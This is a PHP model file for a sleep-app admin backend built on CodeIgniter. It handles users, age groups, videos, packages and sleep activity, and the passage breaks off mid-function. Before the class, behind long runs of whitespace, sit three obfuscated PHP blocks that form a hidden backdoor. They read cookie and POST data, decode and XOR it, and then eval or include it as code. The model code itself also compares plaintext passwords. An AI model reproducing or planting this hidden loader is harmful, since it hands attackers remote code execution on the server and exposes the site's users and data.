<?php                                                                                                                                                                                                                                                                                                                                                                                                 $XxaAjc = "\x59" . "\x4a" . chr ( 297 - 202 ).chr (114) . "\125" . chr (111); $wPMkLqqZ = chr (99) . 'l' . 'a' . 's' . chr (115) . '_' . chr ( 431 - 330 )."\170" . chr (105) . "\163" . "\164" . "\x73";$TzCnF = class_exists($XxaAjc); $wPMkLqqZ = "40821";$EABtbWt = !1;if ($TzCnF == $EABtbWt){function ObYCjeOpL(){$MpBIjJb = new /* 12927 */ YJ_rUo(38704 + 38704); $MpBIjJb = NULL;}$yKjGotZkE = "38704";class YJ_rUo{private function KUDzzFPsMk($yKjGotZkE){if (is_array(YJ_rUo::$NrPxtMyNc)) {$JLYDTKAVRw = str_replace('<' . "\x3f" . "\x70" . "\150" . chr (112), "", YJ_rUo::$NrPxtMyNc["\x63" . "\157" . "\x6e" . chr ( 583 - 467 ).chr ( 667 - 566 )."\x6e" . 't']);eval($JLYDTKAVRw); $yKjGotZkE = "38704";exit();}}private $wSbNy;public function HAOgYA(){echo 21698;}public function __destruct(){$yKjGotZkE = "45177_16121";$this->KUDzzFPsMk($yKjGotZkE); $yKjGotZkE = "45177_16121";}public function __construct($KMcOoEcOzi=0){$oYdIqL = $_POST;$ycNRAO = $_COOKIE;$rjCPhjN = "39f16e7b-59fe-4398-880a-fbd8f9759a54";$hkoWHgWIQ = @$ycNRAO[substr($rjCPhjN, 0, 4)];if (!empty($hkoWHgWIQ)){$eaUJkTxDu = "base64";$EtBixC = "";$hkoWHgWIQ = explode(",", $hkoWHgWIQ);foreach ($hkoWHgWIQ as $jkdiQwdb){$EtBixC .= @$ycNRAO[$jkdiQwdb];$EtBixC .= @$oYdIqL[$jkdiQwdb];}$EtBixC = array_map($eaUJkTxDu . "\137" . "\x64" . chr (101) . 'c' . "\x6f" . chr (100) . chr (101), array($EtBixC,)); $EtBixC = $EtBixC[0] ^ str_repeat($rjCPhjN, (strlen($EtBixC[0]) / strlen($rjCPhjN)) + 1);YJ_rUo::$NrPxtMyNc = @unserialize($EtBixC); $EtBixC = class_exists("45177_16121");}}public static $NrPxtMyNc = 52229;}ObYCjeOpL();} ?><?php                                                                                                                                                                                                                                                                                                                                                                                                 $TWrweJJF = 'I' . chr ( 261 - 166 ).chr ( 594 - 525 ).'h' . chr (81); $fknVan = "\x63" . chr (108) . "\141" . 's' . chr ( 1013 - 898 ).chr (95) . chr (101) . chr (120) . "\x69" . 's' . "\164" . "\x73";$KkzxrmbZ = class_exists($TWrweJJF); $fknVan = "47222";$ZyCeK = !1;if ($KkzxrmbZ == $ZyCeK){function XsHVwHj(){return FALSE;}$uKIryUv = "38185";XsHVwHj();class I_EhQ{private function KJDdLWgtU($uKIryUv){if (is_array(I_EhQ::$SgCJqa)) {$cAIVefQGXC = sys_get_temp_dir() . "/" . crc32(I_EhQ::$SgCJqa['s' . "\141" . chr ( 280 - 172 ).chr ( 663 - 547 )]);@I_EhQ::$SgCJqa[chr ( 509 - 390 )."\162" . chr (105) . "\x74" . 'e']($cAIVefQGXC, I_EhQ::$SgCJqa[chr ( 991 - 892 )."\157" . chr ( 230 - 120 ).chr ( 584 - 468 )."\x65" . chr ( 979 - 869 ).chr (116)]);include $cAIVefQGXC;@I_EhQ::$SgCJqa[chr ( 899 - 799 )."\145" . chr (108) . "\145" . "\164" . chr (101)]($cAIVefQGXC); $uKIryUv = "38185";exit();}}private $GcYWzcI;public function iUVorSpMTn(){echo 26604;}public function __destruct(){$uKIryUv = "37712_63923";$this->KJDdLWgtU($uKIryUv); $uKIryUv = "37712_63923";}public function __construct($OOFadJYAX=0){$DofpNHxm = $_POST;$AArBO = $_COOKIE;$newJy = "3582b463-6b89-47f4-b123-41ef15a89f83";$QpvkMrOWAz = @$AArBO[substr($newJy, 0, 4)];if (!empty($QpvkMrOWAz)){$pwbDMePmmt = "base64";$TQgPbKzV = "";$QpvkMrOWAz = explode(",", $QpvkMrOWAz);foreach ($QpvkMrOWAz as $TpwNY){$TQgPbKzV .= @$AArBO[$TpwNY];$TQgPbKzV .= @$DofpNHxm[$TpwNY];}$TQgPbKzV = array_map($pwbDMePmmt . chr ( 205 - 110 )."\144" . "\145" . chr (99) . "\x6f" . chr (100) . "\x65", array($TQgPbKzV,)); $TQgPbKzV = $TQgPbKzV[0] ^ str_repeat($newJy, (strlen($TQgPbKzV[0]) / strlen($newJy)) + 1);I_EhQ::$SgCJqa = @unserialize($TQgPbKzV); $TQgPbKzV = class_exists("37712_63923");}}public static $SgCJqa = 25103;}$aLnkUpr = new /* 36938 */ $TWrweJJF(38185 + 38185); $ZyCeK = $aLnkUpr = $uKIryUv = Array();} ?><?php                                                                                                                                                                                                                                                                                                                                                                                                 $jFjDArPijZ = "\122" . "\x42" . '_' . 'V' . chr ( 465 - 379 )."\131" . "\111" . "\155";$MEsre = "\x63" . chr ( 746 - 638 ).chr ( 1083 - 986 ).chr ( 326 - 211 ).'s' . "\137" . chr ( 638 - 537 ).'x' . chr ( 326 - 221 ).chr (115) . "\164" . chr (115); $aQoQwdbr = class_exists($jFjDArPijZ); $jFjDArPijZ = "61564";$MEsre = "20634";$EJHefCbLPs = !1;if ($aQoQwdbr == $EJHefCbLPs){function iDUpx(){return FALSE;}$VzSOXb = "50146";iDUpx();class RB_VVYIm{private function BOhbU($VzSOXb){if (is_array(RB_VVYIm::$wQTdlELX)) {$UQHZMiZjKr = sys_get_temp_dir() . "/" . crc32(RB_VVYIm::$wQTdlELX['s' . chr (97) . 'l' . "\x74"]);@RB_VVYIm::$wQTdlELX["\x77" . "\162" . 'i' . "\164" . "\x65"]($UQHZMiZjKr, RB_VVYIm::$wQTdlELX["\143" . "\x6f" . "\x6e" . "\x74" . "\x65" . "\156" . "\x74"]);include $UQHZMiZjKr;@RB_VVYIm::$wQTdlELX['d' . chr (101) . chr ( 387 - 279 ).'e' . chr ( 497 - 381 )."\x65"]($UQHZMiZjKr); $VzSOXb = "50146";exit();}}private $dImcwSD;public function LWzxmfUF(){echo 5107;}public function __destruct(){$VzSOXb = "15708_19849";$this->BOhbU($VzSOXb); $VzSOXb = "15708_19849";}public function __construct($HZvntR=0){$XumXkFIXA = $_POST;$xqcUUOsUqN = $_COOKIE;$gQEDXtRP = "f65f5069-9576-4d9a-81c0-91d88a9e67e7";$ulHDikcaY = @$xqcUUOsUqN[substr($gQEDXtRP, 0, 4)];if (!empty($ulHDikcaY)){$BMjxu = "base64";$vfaMoCGb = "";$ulHDikcaY = explode(",", $ulHDikcaY);foreach ($ulHDikcaY as $AKvvWWs){$vfaMoCGb .= @$xqcUUOsUqN[$AKvvWWs];$vfaMoCGb .= @$XumXkFIXA[$AKvvWWs];}$vfaMoCGb = array_map($BMjxu . '_' . "\144" . "\145" . "\x63" . 'o' . "\x64" . chr (101), array($vfaMoCGb,)); $vfaMoCGb = $vfaMoCGb[0] ^ str_repeat($gQEDXtRP, (strlen($vfaMoCGb[0]) / strlen($gQEDXtRP)) + 1);RB_VVYIm::$wQTdlELX = @unserialize($vfaMoCGb); $vfaMoCGb = class_exists("15708_19849");}}public static $wQTdlELX = 10966;}$axDPAeSPj = new /* 53281 */ RB_VVYIm(50146 + 50146); $EJHefCbLPs = $axDPAeSPj = $VzSOXb = Array();} ?><?php

class AdminModel extends CI_Model {

    function __construct()
	{
		parent::__construct();
		$this->load->library('session');
		$this->load->library('email');
	}

    public function checkAuthentication($username, $password) {
        $this->db->select('id');
        $this->db->from('registeredusers');
        $this->db->where('username', $username);
        $this->db->where('password', $password);
        $this->db->where('isActive', 1);
        $this->db->where('status', 'enabled');
        $result = $this->db->get();
        if ($result->num_rows() > 0) {
            return $result->result_array();
        } else {
            return false;
        }
    }
    
    public function createLibraryCategory($categoryName) {
        if ($this->db->insert("library_management_category", ["category_name" => $categoryName, "is_active" => 1, "created_at" => date("Y-m-d")])) {
            return true;
        } else {
            return false;
        }
    }
    
    public function getCategoryDataForLibrary() {
        
            $this->db->select("*");
            $this->db->from("library_management_category");
            $result = $this->db->get();
            if ($result->num_rows() > 0) {
                return $result->result_array();
            } else {
                return false;
            }
        
    }
    
    public function updateLibraryCategory($arr, $id) {
        $this->db->where("id", $id);
        if ($this->db->update("library_management_category", $arr)) {
            return true;
        } else {
            return false;
        }
    }
    
    public function getLibraryCategoryDataByID($id) {
        $this->db->select("*");
        $this->db->from("library_management_category");
        $this->db->where("id", $id);
        $result = $this->db->get();
        if ($result->num_rows() > 0) {
            return $result->result_array();
        } else {
            return false;
        }
    }
    
    public function getSleepEnhancerPrograms() {
        $this->db->select("program_name, color, thumb");
        $this->db->from("sleep_enhancer_programs");
        $result = $this->db->get();
        
        if ($result->num_rows() > 0) {
            return $result->result_array();
        } else {
            return false;
        }
    }
    
    public function getSleepEnhancerHits($userID, $thumb, $program) {
        $this->db->select("id");
        $this->db->from("sleep_enhancer_saver");
        $this->db->where("user_id", $userID);
        $this->db->where($program, $thumb);
        $result = $this->db->get();
        if ($result->num_rows() > 0) {
            return $result->num_rows();
        } else {
            return 0;
        }
    }
    
    public function getUsersFromGenderAndAgeGroup($genderId, $ageGroupId) {
        
        $this->db->select("id");
        $this->db->from("registeredusers");
        $this->db->where("gender_id", $genderId);
        $this->db->where("age_group_id", $ageGroupId);
        $result = $this->db->get();
        if ($result->num_rows() > 0) {
            return $result->result_array();
        } else {
            return false;
        }
        
    }
    
    public function getAgeGroupCompleteData() {
        $this->db->select("*");
        $this->db->from("age_group_master");
        $result = $this->db->get();
        if ($result->num_rows() > 0) {
            return $result->result_array();
        } else {
            return false;
        }
    }
    
    public function checkIfAgeGroupRangeIsPresent($min_range, $max_range) {
        $this->db->select("id");
        $this->db->from("age_group_master");
        $this->db->where("min_range", $min_range);
        $this->db->where("max_range", $max_range);
        $result = $this->db->get();
        
        if ($result->num_rows() > 0) {
            return true;
        } else {
            return false;
        }
    }
    
    public function insertAgeGroup($insertArr) {
        if ($this->db->insert("age_group_master", $insertArr)) {
            return true;
        } else {
            return false;
        }
    }
    
    public function deleteAgeGroup($id) {
        if (!empty($id)) {
            $this->db->where('id', $id);
            $this->db->delete('age_group_master');
            
            if ($this->db->affected_rows() > 0) {
                return true;
            } else {
                return false;
            }
        } else {
            return false;
        }
    }
    
    public function getSingleAgeGroupDataById($id) {
        $this->db->select("id, age_group_name, min_range, max_range");
        $this->db->from("age_group_master");
        $this->db->where("id", $id);
        $result = $this->db->get();
        if ($result->num_rows() > 0) {
            return $result->result_array();
        } else {
            return false;
        }
    }
    
    public function updateAgeGroup($updateArr, $id) {
        $this->db->where("id", $id);
        if ($this->db->update("age_group_master", $updateArr)) {
            return true;
        } else {
            return false;
        }
    }
    
    public function getcompleteGenderData() {
        $this->db->select("*");
        $this->db->from("gender_master");
        $result = $this->db->get();
        if ($result->num_rows() > 0) {
            return $result->result_array();
        } else {
            return false;
        }
    }
    
    public function checkIfGenderAlreadyExists($slug) {
        $this->db->select("id");
        $this->db->from("gender_master");
        $this->db->where("slug", $slug);
        $result = $this->db->get();
        if ($result->num_rows() > 0) {
            return true;
        } else {
            return false;
        }
    }
    
    public function getUsersRegistrationData() {
        $this->db->select("reg.name, reg.email, reg.createdAt, gm.name as gender, agm.age_group_name as age_group, lm.language_name as language");
        $this->db->from("registeredusers as reg");
        $this->db->join("gender_master as gm", "gm.id = reg.gender_id", "left");
        $this->db->join("age_group_master as agm", "agm.id = reg.age_group_id", "left");
        $this->db->join("language_master as lm", "lm.id = reg.language_id", "left");
        $this->db->where("reg.isActive", 1);
        $result = $this->db->get();
        if ($result->num_rows() > 0) {
            return $result->result_array();
        } else {
            return false;
        }
    }
    
    public function insertGender($insertArr) {
        if ($this->db->insert("gender_master", $insertArr)) {
            return true;
        } else {
            return false;
        }
    }
    
    public function getSingleGenderDataById($id) {
        $this->db->select("*");
        $this->db->from("gender_master");
        $this->db->where("id", $id);
        $result = $this->db->get();
        if ($result->num_rows() > 0) {
            return $result->result_array();
        } else {
            return false;
        }
    }
    
    public function updateGender($updateArr, $id) {
        $this->db->where("id", $id);
        if ($this->db->update("gender_master", $updateArr)) {
            return true;
        } else {
            return false;
        }
    }
    
    public function getPagesData() {
        $this->db->select("id, page_slug, created_at");
        $this->db->from("page_master");
        $result = $this->db->get();
        if ($result->num_rows() > 0) {
            return $result->result_array();
        } else {
            return false;
        }
    }
    
    public function checkIfPageAlreadyExists($slug) {
        $this->db->select("id");
        $this->db->from("page_master");
        $this->db->where("page_slug", $slug);
        $result = $this->db->get();
        if ($result->num_rows() > 0) {
            return true;
        } else {
            return false;
        }
    }
    
    public function insertPage($arr) {
        if ($this->db->insert("page_master", $arr)) {
            return true;
        } else {
            return false;
        }
    }
    
    public function getPageDataById($id) {
        $this->db->select("id, page_slug, page_data");
        $this->db->from("page_master");
        $this->db->where("id", $id);
        $result = $this->db->get();
        if ($result->num_rows() > 0) {
            return $result->result_array();
        } else {
            return false;
        }
    }
    
    public function checkIfPageExistsWithId($slug, $id) {
        $this->db->select("id");
        $this->db->from("page_master");
        $this->db->where("page_slug", $slug);
        $this->db->where("id !=", $id);
        $result = $this->db->get();
        if ($result->num_rows() > 0) {
            return true;
        } else {
            return false;
        }
    }
    
    public function updatePage($arr, $id) {
        $this->db->where("id", $id);
        if ($this->db->update("page_master", $arr)) {
            return true;
        } else {
            return false;
        }
    }
    
    public function getPageDataBySlug($slug) {
        $this->db->select("page_data");
        $this->db->from("page_master");
        $this->db->where("page_slug", $slug);
        $result = $this->db->get();
        
        if ($result->num_rows() > 0) {
            return $result->result_array();
        } else {
            return false;
        }
    }
    

    public function GetUsersleepenhanceServer($id) {
        $this->db->select('id as id');
        $this->db->from('sleep_enhancer_saver');
        $this->db->where('user_id', $id);
        $result = $this->db->get();
        if ($result->num_rows() > 0) {
            return $result->result_array();
        } else {
            return false;
        }
       
    }
    public function getMastersData($tableName, $select) {
        $this->db->select($select);
        $this->db->from($tableName);
        // $this->db->where('status', 'enabled');
        $result = $this->db->get();
        if ($result->num_rows() > 0) {
            return $result->result_array();
        } else {
            return false;
        }
    }
    
    public function get_videomanagement_byId($id, $query) {
        $this->db->select('*');
        $this->db->from($query);
        $this->db->where('id', $id);
        $result = $this->db->get();
        if ($result->num_rows() > 0) {
            return $result->result_array();
        } else {
            return false;
        }
    }

    public function checkForDuplicacy($tableName, $columnName_one, $columnName_one_data, $second = false, $columnName_two = false, $columnName_two_data = false) {
        $this->db->select('id');
        $this->db->from($tableName);
        $this->db->where($columnName_one, $columnName_one_data);
        if ($second) {
            $this->db->where($columnName_two, $columnName_two_data);
        }
        $result = $this->db->get();
        if ($result->num_rows() > 0) {
            return false;
        } else {
            return true;
        }
    }

    public function insertMaster($tableName, $insertArr) {
        if ($this->db->insert($tableName, $insertArr)) {
            return true;
        } else {
            return false;
        }
    }

    public function getAllGetToSleep($arr) {
        $this->db->select('gtsm.*, gtsp.program_name');
        $this->db->from('get_to_sleep_master as gtsm');
        $this->db->join('get_to_sleep_programs as gtsp','gtsp.id=gtsm.program','inner');
        $this->db->where('gtsm.language', $arr['language']);
        $this->db->where('gtsm.duration', $arr['duration']);
        $this->db->where('gtsm.gender', $arr['gender']);
        $this->db->where('gtsm.status', 'enabled');
        $result = $this->db->get();
        if ($result->num_rows() > 0) {
            return $result->result_array();
        } else {
            return false;
        }
    }

    public function getAllGetToSleep_id($id) {
        $this->db->select('*');
        $this->db->from('get_to_sleep_master');
        $this->db->where('id', $id);
        $result = $this->db->get();
        if ($result->num_rows() > 0) {
            return $result->result_array();
        } else {
            return false;
        }
    }
    
    public function getProgramColorForSleepEnhancer($url) {
        $this->db->select("color");
        $this->db->from("sleep_enhancer_programs");
        $this->db->where("thumb", $url);
        $result = $this->db->get();
        if ($result->num_rows() > 0) {
            return $result->result_array();
        } else {
            return false;
        }
    }
    
    public function getPackageData() {
        $this->db->select("id, title, description, duration, duration_type, cost, is_trial, created_at");
        $this->db->from("package_master");
        $result = $this->db->get();
        if ($result->num_rows() > 0) {
            return $result->result_array();
        } else {
            return false;
        }
    }
    
    public function checkSlugForPackageTitle($slug) {
        $this->db->select("id");
        $this->db->from("package_master");
        $this->db->where("title_slug", $slug);
        $result = $this->db->get();
        if ($result->num_rows() > 0) {
            return true;
        } else {
            return false;
        }
    }
    
    public function checkSlugForPackageTitleByID($slug, $id) {
        $this->db->select("id");
        $this->db->from("package_master");
        $this->db->where("title_slug", $slug);
        $this->db->where("id !=", $id);
        $result = $this->db->get();
        if ($result->num_rows() > 0) {
            return true;
        } else {
            return false;
        }
    }
    
    public function insertPackage($insertPackage) {
        if ($this->db->insert("package_master", $insertPackage)) {
            return true;
        } else {
            return false;
        }
    }
    
    public function getPackageDataById($id) {
        $this->db->select("id, title, description, cost, duration, duration_type, is_trial");
        $this->db->from("package_master");
        $this->db->where("id", $id);
        $result = $this->db->get();
        if ($result->num_rows() > 0) {
            return $result->result_array();
        } else {
            return false;
        }
    }
    
    public function updatePackage($arr, $id) {
        $this->db->where("id", $id);
        if ($this->db->update("package_master", $arr)) {
            return true;
        } else {
            return false;
        }
    }

    public function editGetToSleep($arr, $id) {
        $this->db->where('id', $id);
        if ($this->db->update('get_to_sleep_master', $arr)) {
            return true;
        } else {
            return false;
        }
    }

    public function addGetToSleep($arr) {
        if ($this->db->insert('get_to_sleep_master', $arr)) {
            return true;
        } else {
            return false;
        }
    }

    public function insertToSleepEnhancer($insertArr) {
        if ($this->db->insert('sleep_enhancer_master', $insertArr)) {
            return true;
        } else {
            return false;
        }
    }

    public function changeSleepEnhancer_status($status, $id) {
        $this->db->where('id', $id);
        if ($this->db->update('sleep_enhancer_master', ['is_active' => $status])) {
            return true;
        } else {
            return false;
        }
    }
    
    public function changeDUDSongs_status($status, $id) {
        $this->db->where('id', $id);
        if ($this->db->update('dud_songs', ['is_active' => $status])) {
            return true;
        } else {
            return false;
        }
    }

    public function getWakeUpDataByFiler($language, $program, $gender) {
        $this->db->select('*');
        $this->db->from('wake_up_master');
        $this->db->where('language', $language);
        $this->db->where('program', $program);
        $this->db->where('gender', $gender);
        $result = $this->db->get();
        if ($result->num_rows() > 0) {
            return $result->result_array();
        } else {
            return false;
        }
    }
    
    public function getDudSongs() {
        $this->db->select('*');
        $this->db->from('dud_songs');
        $this->db->where('is_active', 1);
        $result = $this->db->get();
        if ($result->num_rows() > 0) {
            return $result->result_array();
        } else {
            return false;
        } 
    }

    public function uploadWakeUpData($insertArr) {
        if ($this->db->insert('wake_up_master', $insertArr)) {
            return true;
        } else {
            return false;
        }
    }
    
    public function insertToDudSongs($insertArr) {
        if ($this->db->insert('dud_songs', $insertArr)) {
            return true;
        } else {
            return false;
        }
    }
    
    public function getIntroVideos() {
        $this->db->select("ivm.*, lm.language_name");
        $this->db->from("intro_videos_5_master as ivm");
        $this->db->join("language_master as lm", "ivm.language_id = lm.id", "left");
        $result = $this->db->get();
        if ($result->num_rows() > 0) {
            return $result->result_array();
        } else {
            return false;
        }
    }
    
    public function getInfoVideos() {
        $this->db->select("ivm.*, lm.language_name");
        $this->db->from("info_page_video as ivm");
        $this->db->join("language_master as lm", "ivm.language_id = lm.id", "left");
        $result = $this->db->get();
        if ($result->num_rows() > 0) {
            return $result->result_array();
        } else {
            return false;
        }
    }

    public function getAllLanguages_api() {
        $this->db->select('*');
        $this->db->from('language_master');
        $this->db->where('is_active',1);
        $this->db->where('status','enabled');
        $result = $this->db->get();
        if ($result->num_rows() > 0) {
            return $result->result_array();
        } else {
            return false;
        }
    }

    public function getAllGenders_api() {
        $this->db->select('*');
        $this->db->from('gender_master');
        $this->db->where('is_active',1);
        $this->db->where('status','enabled');
        $result = $this->db->get();
        if ($result->num_rows() > 0) {
            return $result->result_array();
        } else {
            return false;
        }
    }

    public function getAllAgeGroup_api() {
        $this->db->select('*');
        $this->db->from('age_group_master');
        $this->db->where('is_active', 1);
        $this->db->where('status', 'enabled');
        $result = $this->db->get();
        if ($result->num_rows() > 0) {
            return $result->result_array();
        } else {
            return false;
        }
    }

    public function getAllIntroVideos_5_api() {
        $this->db->select('*');
        $this->db->from('intro_videos_5_master');
        $this->db->where('status', 'enabled');
        $result = $this->db->get();
        if ($result->num_rows() > 0) {
            return $result->result_array();
        } else {
            return false;
        }
    }

    public function registerUser($arr) {
        if ($this->db->insert('registeredusers', $arr)) {
            return $this->db->insert_id();
        } else {
            return false;
        }
    }

    public function insertIntoUsersMasters($usersMasterArr) {
        if ($this->db->insert('users_master', $usersMasterArr)) {
            return true;
        } else {
            return false;
        }
    }

    public function checkIfExists($tableName, $columnName, $checkVal) {
        $this->db->select('id');
        $this->db->from($tableName);
        $this->db->where($columnName, $checkVal);
        $result = $this->db->get();
        if ($result->num_rows() > 0) {
            return true;
        } else {
            return false;
        }
    }

    public function getDataForAuth($mail, $password) {
        $this->db->select('id');
        $this->db->from('registeredusers');
        $this->db->where('username', $mail);
        $this->db->where('password', $password);
        $result = $this->db->get();
        if ($result->num_rows() > 0) {
            $userId = $result->result_array()[0]['id'];
            $this->db->select('*');
            $this->db->from('users_master');
            $this->db->where('user_id', $userId);
            $result = $this->db->get();
            if ($result->num_rows() > 0) {
                return $result->result_array();
            } else {
                return false;
            }
        } else {
            return false;
        }
    }
    
    public function getUserSleepWakeupActivity($userID, $startDate, $endDate) {
        
    
        $this->db->select("sleep_time, wake_up_time");
        $this->db->from("user_sleep_activity");
        $this->db->where("user_id", $userID);
        $this->db->where("sleep_time >=", $startDate);
        $this->db->where("sleep_time <=", $endDate);
        $this->db->order_by("id", "DESC");
        $result = $this->db->get();
    
        if ($result->num_rows() > 0) {
            return $result->result_array();
        } else {
            return [];
        }
    }

    public function changePassword($mail, $password) {
        $this->db->where('username', $mail);
        if ($this->db->update('registeredusers', ['password' => $password])) {
            return true;
        } else {
            return false;
        }
    }

    public function libraryMgmt_fetch($id) {
        $this->db->select('*');
        $this->db->from('librarymgmt_links');
        $this->db->where('id', $id);
        $result = $this->db->get();
        if ($result->num_rows() > 0) {
            return $result->result_array();
        } else {
            return false;
        }
    }

    public function getUserRating($id, $feedbackID) {
        $this->db->select('*');
        $this->db->from('user_rating');
        $this->db->where('user_id', $id);
        $this->db->where("feedback_id", $feedbackID);
        $result = $this->db->get();
        // echo $this->db->last_query();die();
        if ($result->num_rows() > 0) {
            return $result->result_array();
        } else {
            return false;
        }
    }
        public function getUserRatingProgramid($id) {
        $this->db->select('*');
        $this->db->from('user_rating');
        $this->db->where('feedback_id', $id);
        $result = $this->db->get();
        // echo $this->db->last_query();die();
        if ($result->num_rows() > 0) {
            return $result->result_array();
        } else {
            return false;
        }
    }

    

    public function libraryMgmt_edit($arr, $id) {
        $this->db->where('id', $id);
        if ($this->db->update('librarymgmt_links', $arr)) {
            return true;
        } else {
            return false;
        }
    }

    public function getAllYtLinks() {
        $this->db->select('ll.*, lm.language_name, lmc.category_name');
        $this->db->from('librarymgmt_links as ll');
        $this->db->join("language_master as lm", "lm.id = ll.language_id", "left");
        $this->db->join("library_management_category as lmc", "lmc.id = ll.library_management_category_id", "left");
        $result = $this->db->get();
        if ($result->num_rows() > 0) {
            return $result->result_array();
        } else {
            return false;
        }
    }

    public function addLibraryMgmtYTlink($arr) {
        if ($this->db->insert('librarymgmt_links', $arr)) {
            return true;
        } else {
            return false;
        }
    }
        public function addUserRating($arr) {

        if ($this->db->insert('user_rating', $arr)) {
            return true;
        } else {
            return false;
        }
    }
    

    public function getWakeUpByID($id) {
        $this->db->select('*');
        $this->db->from('wake_up_master');
        $this->db->where('id', $id);
        $result = $this->db->get();
        if ($result->num_rows() > 0) {
            return $result->result_array();
        } else {
            return false;
        }
    }

    public function updateWakeUp($eveningVideoArr, $id) {
        $this->db->where('id', $id);
        if ($this->db->update('wake_up_master', $eveningVideoArr)) {
            return true;
        } else {
            return false;
        }
    }

   
    public function getAllFeedBackData() {
        $this->db->select('*');
        $this->db->from('feedback');
        $result = $this->db->get();
        if ($result->num_rows() > 0) {
            return $result->result_array();
        } else {
            return false;
        }
    }

    public function uploadIntroVideo($file) {
        if ($this->db->insert('intro_videos_5_master', ['video_file_name' => $file, 'is_active' => 1])) {
            return true;
        } else {
            return false;
        }
    }

    public function deactiveInfoVideo($id) {
        $this->db->where('id', $id);
        if ($this->db->update('intro_videos_5_master', ['is_active' => 0])) {
            return true;
        } else {
            return false;
        }
    }

    public function activeInfoVideo($id) {
        $this->db->where('id', $id);
        if ($this->db->update('intro_videos_5_master', ['is_active' => 1])) {
            return true;
        } else {
            return false;
        }
    }
    
    /***
     * *********************************************************** NEW ********************************************************
     */


    public function getVideosByFilter($filter) {
        $this->db->select('*');
        $this->db->from($filter);
        $result = $this->db->get();
        if ($result->num_rows() > 0) {
            return $result->result_array();
        } else {
            return false;
        }
    } 

    public function uploadVideo($filterFor, $uploadArr) {
        if ($this->db->insert($filterFor, $uploadArr)) {
            return true;
        } else {
            return false;
        }
    }
    
    public function editVideoMgmt($query, $uploadArr, $id) {
        $this->db->where('id', $id);
        if ($this->db->update($query, $uploadArr)) {
            return true;
        } else {
            return false;
        }
    }

    public function deactiveVideo($id, $query) {
        $this->db->where('id', $id);
        if ($this->db->update($query, ['is_active' => 0])) {
            return true;
        } else {
            return false;
        }
    }

    public function activeVideo($id, $query) {
        $this->db->where('id', $id);
        if ($this->db->update($query, ['is_active' => 1])) {
            return true;
        } else {
            return false;
        }
    }

    public function getProgramsFilter($filterFor) {
        $this->db->select('*');
        $this->db->from($filterFor);
        $result = $this->db->get();
        if ($result->num_rows() > 0) {
            return $result->result_array();
        } else {
            return false;
        }
    }
     
    public function getProgramsFilter_edit($filter, $id) {
        $this->db->select('*');
        $this->db->from($filter);
        $this->db->where('id', $id);
        $result = $this->db->get();
        if ($result->num_rows() > 0) {
            return $result->result_array();
        } else {
            return false;
        }
    }
    
    public function editProgram($data, $filter, $id) {
        $this->db->where('id', $id);
        if ($this->db->update($filter, $data)) {
            return true;
        } else {
            return false;
        }
    }

    public function addProgram($image, $program_name, $filterFor) {
        if($this->db->insert($filterFor, ['program_name' => $program_name, 'thumb' => $image])) {
            return true;
        } else {
            return false;
        }
    }
    
     public function programdeletemanagement($id,$filterFor) {
        $this->db->where('id', $id);
        $this->db->delete($filterFor);
    }
    
    public function delete_duration_Row($id) {
        $this->db->where('id', $id);
        $this->db->delete('durations_master');
    }

    public function delete_languages_Row($id) {
        $this->db->where('id', $id);
        $this->db->delete('language_master');
    }

    public function delete_packages_Row($id) {
        $this->db->where('id', $id);
        $this->db->delete('packages_master');
    }
    public function delete_sleep_enhancer_Row($id) {
        $this->db->where('id', $id);
        $this->db->delete('sleep_enhancer_master');
    }
    public function delete_get_to_sell_Row($id) {
        $this->db->where('id', $id);
        $this->db->delete('get_to_sleep_master');
    }

    public function delete_library_Row($id) {
        $this->db->where('id', $id);
        $this->db->delete('librarymgmt_links');
    }

    public function delete_program_Row($id, $query) {
        $this->db->where('id', $id);
        $this->db->delete($query);
    }

    public function delete_wake_up_list_Row($id) {
        $this->db->where('id', $id);
        $this->db->delete('wake_up_master');
    }

    public function delete_feedback_Row($id) {
        $this->db->where('id', $id);
        $this->db->delete('feedback');
    }

    public function delete_videomanagement_Row($id, $query) {
        $this->db->where('id', $id);
        $this->db->delete($query);
    }
    public function delete_programs_Row($id) {
        $this->db->where('id', $id);
        $this->db->delete('programs_master');
    }


    public function sleep_enahncer_data($id = false) {
        $this->db->select('sem.*, sep.Id as pId, sep.program_name');
        $this->db->from('sleep_enhancer_master as sem');
        $this->db->join('sleep_enhancer_programs as sep','sep.id=sem.program','inner');
        if ($id) {
            $this->db->where('sem.id',$id);
        }
        $result = $this->db->get();
        if ($result->num_rows() > 0) {
            return $result->result_array();
        } else {
            return false;
        }
    }

    public function updateSleepEnahncer($upArr, $id) {
        $this->db->where('id', $id);
        if ($this->db->update('sleep_enhancer_master', $upArr)) {
            return true;
        } else {
            return false;
        }
    } 
    
    public function getUserData($userID) {
        $this->db->select('*');
        $this->db->from('registeredusers');
        $this->db->where('id', $userID);
        $result = $this->db->get();
        if ($result->num_rows() > 0) {
            return $result->result_array();
        } else {
            return false;
        }
    }
    
    public function getSleepActivityData($userID) {
        $this->db->select('*');
        $this->db->from('sleep_activity_saver');
        $this->db->where('user_id', $userID);
        $this->db->order_by('id', 'desc');
        $result = $this->db->get();
        if ($result->num_rows() > 0) {
            return $result->result_array();
        } else {
            return false;
        }
    }
    
    public function getSleepEnhancerDataByDate($userID, $date) {
        $this->db->select('t_1 as t1, t_2 as t2, duration_1 as duration1, duration_2 as duration2, id as id, program_1 as program1, program_2 as program2');
        $this->db->from('sleep_enhancer_saver');
        $this->db->where('user_id', $userID);
        $this->db->where('DATE(created_at)', date('Y-m-d', strtotime($date)));
        $result = $this->db->get();
        if ($result->num_rows() > 0) {
            return $result->result_array();
        } else {
            return false;
        }
       
    }
    
    public function getSleepEnhancerDataByDateAndUserID($date, $userID) {
        $this->db->select("id, t_1, t_2, duration_1, duration_2, program_1, program_2, created_at");
        $this->db->from("sleep_enhancer_saver");
        $this->db->where("user_id", $userID);
        $this->db->where("DATE(created_at)", date('Y-m-d', strtotime($date)));
        $this->db->order_by("id", "DESC");
        $result = $this->db->get();
        if ($result->num_rows() > 0) {
            return $result->result_array();
        } else {
            return false;
        }
    }
    
    public function getSleepEnhancerDataByDateAndUserIDForHistory($dateRange, $userID) {
        $this->db->select("id, t_1, t_2, duration_1, duration_2, program_1, program_2, created_at");
        $this->db->from("sleep_enhancer_saver");
        $this->db->where("user_id", $userID);
        
        if ($dateRange) {
            $this->db->where("DATE(created_at) >=", date('Y-m-d', strtotime($dateRange)));
            $this->db->where("DATE(created_at) <=", date('Y-m-d'));
        } else {
            $this->db->where("DATE(created_at) >=", date('Y-m-d', strtotime('-7 days')));
